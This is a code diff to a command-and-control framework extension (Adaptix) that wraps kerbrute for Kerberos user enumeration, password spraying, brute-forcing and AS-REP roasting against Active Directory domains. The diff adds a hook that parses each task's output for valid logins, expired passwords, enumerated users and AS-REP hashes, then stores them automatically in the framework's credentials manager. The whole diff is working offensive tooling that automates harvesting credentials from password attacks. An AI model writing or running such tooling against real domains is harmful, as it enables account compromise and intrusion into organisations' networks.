@@ -25,11 +25,15 @@ function bof_path(id) {
 }
 
 function pack_and_exec(id, cmdline, list_b64, domain, dc, single, mode,
-                       delay, flags, jitter, task_msg) {
+                       delay, flags, jitter, task_msg, hook) {
     var bof_args = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int,int",
         [list_b64, domain, dc || "", single || "", mode, delay || 0, flags || 0, jitter || 0]);
-    ax.execute_alias(id, cmdline,
-        "execute bof " + bof_path(id) + " " + bof_args, task_msg);
+    if (hook)
+        ax.execute_alias_hook(id, cmdline,
+            "execute bof " + bof_path(id) + " " + bof_args, task_msg, hook);
+    else
+        ax.execute_alias(id, cmdline,
+            "execute bof " + bof_path(id) + " " + bof_args, task_msg);
 }
 
 function build_flags(j) {
@@ -40,6 +44,98 @@ function build_flags(j) {
     if (j["--roast"])     f |= FLAG_ROAST;
     return f;
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Phase 5 — Credentials Manager auto-save
+//
+// PostHook fires after every BOF task completes and output is received.
+// Parses [+] VALID LOGIN and [+] VALID (expired) lines, extracts
+// username / password / domain, and saves to the Adaptix Credentials Manager.
+//
+// ax.credentials_add(username, password, realm, type, tag, storage, host)
+// ─────────────────────────────────────────────────────────────────────────────
+var cred_hook = function(task) {
+    var output = task["text"] || "";
+    var lines  = output.split("\n");
+    var saved  = 0;
+
+    for (var i = 0; i < lines.length; i++) {
+        var line   = lines[i].trim();
+        var at_idx, username, domain, realm;
+
+        /* ── Valid login / expired password ─────────────────────────────────── */
+        var auth_tag = "";
+        if (line.indexOf("[+] VALID LOGIN: ") === 0)          auth_tag = "kerbrute";
+        else if (line.indexOf("[+] VALID (expired): ") === 0) auth_tag = "kerbrute-expired";
+
+        if (auth_tag) {
+            var rest    = line.substring(line.indexOf(": ") + 2).trim();
+            var sep_idx = rest.indexOf(" : ");
+            if (sep_idx >= 0) {
+                var userdom  = rest.substring(0, sep_idx).trim();
+                var password = rest.substring(sep_idx + 3).trim();
+                at_idx = userdom.indexOf("@");
+                if (at_idx >= 0) {
+                    username = userdom.substring(0, at_idx);
+                    domain   = userdom.substring(at_idx + 1);
+                    ax.credentials_add(username, password, domain,
+                                        "password", auth_tag, "manual", "");
+                    ax.log("[cred-manager] Saved login: " + username + "@" + domain);
+                    saved++;
+                }
+            }
+            continue;
+        }
+
+        /* ── Valid user / ASREP roastable (userenum — no password) ──────────── */
+        if (line.indexOf("[+] VALID USER: ") === 0 ||
+            line.indexOf("[+] ASREP ROASTABLE") === 0) {
+            var rest = line.substring(line.indexOf(": ") + 2).trim();
+            at_idx = rest.indexOf("@");
+            if (at_idx >= 0) {
+                username = rest.substring(0, at_idx);
+                domain   = rest.substring(at_idx + 1);
+                ax.credentials_add(username, "", domain,
+                                    "password", "kerbrute-userenum", "manual", "");
+                ax.log("[cred-manager] Saved user: " + username + "@" + domain);
+                saved++;
+            }
+            continue;
+        }
+
+        /* ── AS-REP roast hash (userenum --roast) ────────────────────────────  */
+        /* Line: [HASH] $krb5asrep$<etype>$user@REALM:hexdata                   */
+        if (line.indexOf("[HASH] $krb5asrep$") === 0) {
+            var hash    = line.substring("[HASH] ".length).trim();
+            var cr_type = "hash";
+            if      (hash.indexOf("$krb5asrep$23$") === 0) cr_type = "rc4";
+            else if (hash.indexOf("$krb5asrep$18$") === 0) cr_type = "aes256";
+            else if (hash.indexOf("$krb5asrep$17$") === 0) cr_type = "aes128";
+
+            /* Split on "$" → ["", "krb5asrep", "18", "user@REALM:hex"] */
+            var parts = hash.split("$");
+            if (parts.length >= 4) {
+                var userpart = parts[3].split(":")[0];   /* "user@REALM" */
+                at_idx = userpart.indexOf("@");
+                if (at_idx >= 0) {
+                    username = userpart.substring(0, at_idx);
+                    realm    = userpart.substring(at_idx + 1).toLowerCase();
+                    ax.credentials_add(username, hash, realm,
+                                        cr_type, "kerbrute-asrep", "manual", "");
+                    ax.log("[cred-manager] Saved ASREP hash: " + username + "@" + realm
+                           + " (" + cr_type + ")");
+                    saved++;
+                }
+            }
+            continue;
+        }
+    }
+
+    if (saved > 0)
+        ax.log("[cred-manager] " + saved + " entry/entries added to Credentials Manager.");
+
+    return task;   /* hook must return the task object */
+};
 
 // ─────────────────────────────────────────────────────────────────────────────
 // userenum
@@ -72,7 +168,8 @@ cmd_userenum.setPreHook(function(id, cmdline, parsed_json) {
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
         parsed_json["jitter"] || 0,
-        "Task: [kerbrute] userenum → " + parsed_json["domain"]);
+        "Task: [kerbrute] userenum → " + parsed_json["domain"],
+        cred_hook);
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -107,7 +204,8 @@ cmd_spray.setPreHook(function(id, cmdline, parsed_json) {
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
         parsed_json["jitter"] || 0,
-        "Task: [kerbrute] spray → " + parsed_json["domain"] + " : " + parsed_json["password"]);
+        "Task: [kerbrute] spray → " + parsed_json["domain"] + " : " + parsed_json["password"],
+        cred_hook);
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -143,7 +241,8 @@ cmd_bruteuser.setPreHook(function(id, cmdline, parsed_json) {
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
         parsed_json["jitter"] || 0,
-        "Task: [kerbrute] bruteuser → " + parsed_json["username"] + "@" + parsed_json["domain"]);
+        "Task: [kerbrute] bruteuser → " + parsed_json["username"] + "@" + parsed_json["domain"],
+        cred_hook);
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -177,7 +276,8 @@ cmd_bruteforce.setPreHook(function(id, cmdline, parsed_json) {
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
         parsed_json["jitter"] || 0,
-        "Task: [kerbrute] bruteforce → " + parsed_json["domain"]);
+        "Task: [kerbrute] bruteforce → " + parsed_json["domain"],
+        cred_hook);
 });
 
 // ─────────────────────────────────────────────────────────────────────────────
